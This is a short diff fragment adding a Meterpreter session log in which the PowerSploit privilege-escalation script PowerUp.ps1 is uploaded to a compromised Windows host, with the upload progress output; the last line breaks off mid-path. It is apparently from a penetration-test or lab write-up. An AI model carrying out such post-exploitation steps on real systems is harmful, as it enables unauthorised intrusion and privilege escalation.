@@ -1,0 +1,3 @@
+meterpreter > upload /usr/lib/python3/dist-packages/cme/data/powersploit/Privesc/PowerUp.ps1
+[*] uploading  : /usr/lib/python3/dist-packages/cme/data/powersploit/Privesc/PowerUp.ps1 -> PowerUp.ps1
+[*] Uploaded 549.65 KiB of 549.65 KiB (100.0%): /usr/lib/python3/dist-packages/cme/data/powersploit/Privesc/PowerU
